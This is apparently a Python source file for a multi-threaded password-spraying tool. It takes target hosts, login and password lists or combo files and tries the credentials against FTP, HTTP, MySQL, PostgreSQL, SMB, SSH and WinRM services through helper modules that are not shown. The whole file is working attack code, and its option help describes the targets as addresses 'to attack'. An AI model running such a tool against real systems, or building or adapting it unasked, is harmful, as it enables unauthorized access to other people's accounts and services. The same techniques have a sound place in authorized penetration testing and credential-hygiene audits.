import sys
import protocol_ftp
import protocol_http
import protocol_mysql
import protocol_postgresql
import protocol_smb
import protocol_ssh
import protocol_winrm
from time import sleep
from queue import Queue
from threading import Thread
from optparse import OptionParser
from colorama import init, Fore

init(autoreset=True)


def q_ftp(q_hosts, log, pas, single_log, single_pas):
    while True:
        host = q_hosts.get()
        if single_log and not single_pas:
            for i in range(len(pas)):
                protocol_ftp.con_ftp(host=host, user=log[0], secret=pas[i])
        elif not single_log and single_pas:
            for i in range(len(log)):
                protocol_ftp.con_ftp(host=host, user=log[i], secret=pas[0])
        elif not single_pas and not single_log:
            for i in range(len(log)):
                protocol_ftp.con_ftp(host=host, user=log[i], secret=pas[i])
        q_hosts.task_done()


def q_http(q_hosts, log, pas, single_log, single_pas):
    while True:
        host = q_hosts.get()
        if single_log and not single_pas:
            for i in range(len(pas)):
                protocol_http.con_http(host=host, user=log[0], secret=pas[i])
        elif not single_log and single_pas:
            for i in range(len(log)):
                protocol_http.con_http(host=host, user=log[i], secret=pas[0])
        elif not single_pas and not single_log:
            for i in range(len(log)):
                protocol_http.con_http(host=host, user=log[i], secret=pas[i])
        q_hosts.task_done()


def q_mysql(q_hosts, log, pas, single_log, single_pas, q_dbname):
    while True:
        host = q_hosts.get()
        dbname = q_dbname.get()
        if single_log and not single_pas:
            for i in range(len(pas)):
                protocol_mysql.con_msql(host=host, user=log[0], secret=pas[i], datab_name=dbname)
        elif not single_log and single_pas:
            for i in range(len(log)):
                protocol_mysql.con_msql(host=host, user=log[i], secret=pas[0], datab_name=dbname)
        elif not single_pas and not single_log:
            for i in range(len(log)):
                protocol_mysql.con_msql(host=host, user=log[i], secret=pas[i], datab_name=dbname)
        q_hosts.task_done()


def q_postgresql(q_hosts, log, pas, single_log, single_pas, q_dbname):
    while True:
        host = q_hosts.get()
        dbname = q_dbname.get()
        if single_log and not single_pas:
            for i in range(len(pas)):
                protocol_postgresql.con_psgrsql(host=host, user=log[0], secret=pas[i], datab_name=dbname)
        elif not single_log and single_pas:
            for i in range(len(log)):
                protocol_postgresql.con_psgrsql(host=host, user=log[i], secret=pas[0], datab_name=dbname)
        elif not single_pas and not single_log:
            for i in range(len(log)):
                protocol_postgresql.con_psgrsql(host=host, user=log[i], secret=pas[i], datab_name=dbname)
        q_hosts.task_done()


def q_smb(q_hosts, log, pas, single_log, single_pas):
    while True:
        host = q_hosts.get()
        if single_log and not single_pas:
            for i in range(len(pas)):
                protocol_smb.con_smb(name_server=host, user=log[0], secret=pas[i])
        elif not single_log and single_pas:
            for i in range(len(log)):
                protocol_smb.con_smb(name_server=host, user=log[i], secret=pas[0])
        elif not single_pas and not single_log:
            for i in range(len(log)):
                protocol_smb.con_smb(name_server=host, user=log[i], secret=pas[i])
        q_hosts.task_done()


def q_ssh(q_hosts, log, pas, single_log, single_pas):
    while True:
        host = q_hosts.get()
        if single_log and not single_pas:
            for i in range(len(pas)):
                protocol_ssh.con_ssh(host=host, user=log[0], secret=pas[i])
        elif not single_log and single_pas:
            for i in range(len(log)):
                protocol_ssh.con_ssh(host=host, user=log[i], secret=pas[0])
        elif not single_pas and not single_log:
            for i in range(len(log)):
                protocol_ssh.con_ssh(host=host, user=log[i], secret=pas[i])
        q_hosts.task_done()


def q_winrm(q_hosts, log, pas, single_log, single_pas):
    while True:
        host = q_hosts.get()
        if single_log and not single_pas:
            for i in range(len(pas)):
                protocol_winrm.con_winrm(host=host, user=log[0], secret=pas[i])
        elif not single_log and single_pas:
            for i in range(len(log)):
                protocol_winrm.con_winrm(host=host, user=log[i], secret=pas[0])
        elif not single_pas and not single_log:
            for i in range(len(log)):
                protocol_winrm.con_winrm(host=host, user=log[i], secret=pas[i])
        q_hosts.task_done()


def finisher():
    print("------------------------------------")
    print("password spraying has been completed")
    print("------------------------------------")
    sys.exit(0)


class PasswordSpraying:
    def __init__(self):
        self.info = "Simple password spraying"
        self.protocol = None
        self.target = []
        self.dbname = []
        self.log = []
        self.pas = []
        self.file_target = None
        self.file_log = None
        self.file_pas = None
        self.singleMode = False
        self.singlelog = False
        self.singlepas = False
        self.attempts = 0

    def startup(self):
        print(self.info)
        print('Supported protocols:')
        print('[*] - ftp')
        print('[*] - http')
        print('[*] - mysql')
        print('[*] - postgresql')
        print('[*] - smb')
        print('[*] - ssh')
        print('[*] - winrm\n')

        usage = '{} [-p protocol] [-i singleTarget] [-up singleLogPas]'.format(sys.argv[0])

        option = OptionParser(version=self.info, usage=usage)

        option.add_option('-p', dest='protocol',
                          help='choose your protocol')
        option.add_option('-i', type=str, dest='singleTarget',
                          help='ip address or url to attack')
        option.add_option('-I', dest='targetFile',
                          help='type path to file with ip or url to attack')
        option.add_option('-l', type=str, dest='singlelogin',
                          help='single possible user')
        option.add_option('-s', type=str, dest='singlepas',
                          help='single possible password')
        option.add_option('-L', dest='filelogin',
                          help='file with logins')
        option.add_option('-S', dest='filepas',
                          help='file witn passwords')
        option.add_option('-C', dest='combofile',
                          help='file with login and passwords')
        option.add_option('-N', dest='dbname',
                          help='name of database for mysql and postgresql')
        option.add_option('-a', dest='attmpts',
                          help='number of attempts')

        (options, args) = option.parse_args()

        if not options.protocol and not options.singleTarget and not options.targetFile:
            print(Fore.RED + '-> you should set protocol and ips!')
            option.print_help()
            sys.exit(1)
        elif options.dbname and (options.protocol != 'mysql' or options.protocol != 'postgesql'):
            print(Fore.RED + '-> you can use this flag only with mysql and postgresql')
            option.print_help()
            sys.exit(1)
        elif (options.protocol == 'mysql' or options.protocol == 'postgesql') and not options.dbname:
            print(Fore.RED + '-> you should set database name')
        elif not (options.singlelogin and options.filelogin) and not (options.singlepas and options.filepas):
            file_cond = ((options.singlelogin or options.filelogin) and (
                    options.singlepas or options.filepas)) and not options.combofile
            if (options.combofile and not file_cond) or file_cond:
                if options.singleTarget and not options.targetFile:
                    self.singleMode = True
                    self.func_target(options)
                elif not options.singleTarget and options.targetFile:
                    self.singleMode = False
                    self.func_target(options)
                else:
                    print(Fore.RED + '-> you should set mode of program: single or several targets!')
                    option.print_help()
                    sys.exit(1)
            else:
                print(Fore.RED + '-> you should type pair of possible user and password or path to this file')
                option.print_help()
                sys.exit(1)
        else:
            print(Fore.RED + '-> you not allowed to use two flags for logins or passwords')
            option.print_help()
            sys.exit(1)

    def func_target(self, options):

        self.protocol = options.protocol
        checker_log = False
        checker_pas = False

        if self.singleMode:
            self.target.append(str(options.singleTarget))
            if options.dbname:
                self.dbname.append(str(options.dbname))
        elif not self.singleMode:
            path_target = options.targetFile
            with open(path_target, mode='r') as f:
                for target_line in f:
                    if str(options.protocol) == "mysql" or str(options.protocol) == "postgresql":
                        target_line = target_line.rstrip('\n')
                        target_line_split = target_line.split()
                        self.target.append(target_line_split[0])
                        self.dbname.append(target_line_split[1])
                    else:
                        target_line = target_line.rstrip('\n')
                        self.target.append(target_line)
        else:
            print(Fore.RED + '-> Check targets flags ')
            sys.exit(1)

        if options.singlelogin:
            self.log.append(str(options.singlelogin))
            self.singlelog = True
            checker_log = True
        elif options.filelogin:
            checker_log = True
            path_log = str(options.filelogin)
            with open(path_log, mode='r') as f:
                for log_line in f:
                    log_line = log_line.rstrip('\n')
                    self.log.append(log_line)
        elif not options.singlelogin and not options.filelogin and not options.combofile:
            print(Fore.RED + '-> Check login flags')
            sys.exit(1)

        if options.singlepas:
            self.pas.append(str(options.singlepas))
            self.singlepas = True
            checker_pas = True
        elif options.filepas:
            checker_pas = True
            path_pas = str(options.filepas)
            with open(path_pas, mode='r') as f:
                for pas_line in f:
                    pas_line = pas_line.rstrip('\n')
                    self.pas.append(pas_line)
        elif not options.singlepas and not options.filepas and not options.combofile:
            checker_pas = False
            print(Fore.RED + '-> Check passwords flags')
            sys.exit(1)

        if options.combofile and not checker_log and not checker_pas:
            checker_log = True
            checker_pas = True
            path = str(options.combofile)
            with open(path, mode='r') as f:
                for line in f:
                    line = line.rstrip('\n')
                    splt_line = line.split()
                    self.log.append(splt_line[0])
                    self.pas.append(splt_line[1])
        elif checker_log and checker_pas and options.combofile:
            print(Fore.RED + '-> Check flags')
            sys.exit(1)

        if checker_log and checker_pas:
            self.pas_spray()

    def pas_spray(self):

        q_hosts = Queue()

        targets_num = int(len(self.target))

        match self.protocol:
            case 'ftp':
                for x in range(0, targets_num):
                    q_hosts.put(self.target[x])
                    Thread(target=q_ftp,
                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas)).start()
                    sleep(5)
                q_hosts.join()

            case 'http':
                for x in range(0, targets_num):
                    q_hosts.put(self.target[x])
                    Thread(target=q_http,
                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas)).start()
                    sleep(5)

            case 'mysql':
                q_dbnames = Queue()
                for y in self.dbname:
                    q_dbnames.put(y)
                for x in range(0, targets_num):
                    q_hosts.put(self.target[x])
                    Thread(target=q_mysql,
                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas, q_dbnames)).start()
                    sleep(5)
                q_hosts.join()

            case 'postgresql':
                q_dbnames = Queue()
                for y in self.dbname:
                    q_dbnames.put(y)
                for x in range(0, targets_num):
                    q_hosts.put(self.target[x])
                    Thread(target=q_postgresql,
                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas, q_dbnames)).start()
                    sleep(5)
                q_hosts.join()

            case 'smb':
                for x in range(0, targets_num):
                    q_hosts.put(self.target[x])
                    Thread(target=q_smb,
                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas)).start()
                    sleep(5)
                q_hosts.join()

            case 'ssh':
                for x in range(0, targets_num):
                    q_hosts.put(self.target[x])
                    Thread(target=q_ssh,
                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas)).start()
                    sleep(5)
                q_hosts.join()

            case 'winrm':
                for x in range(0, targets_num):
                    q_hosts.put(self.target[x])
                    Thread(target=q_winrm,
                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas)).start()
                    sleep(5)
                q_hosts.join()
            case _:
                print(Fore.RED + "-> protocol doesn't exist")
                sys.exit(1)
        finisher()


if __name__ == '__main__':
    ps = PasswordSpraying()
    ps.startup()
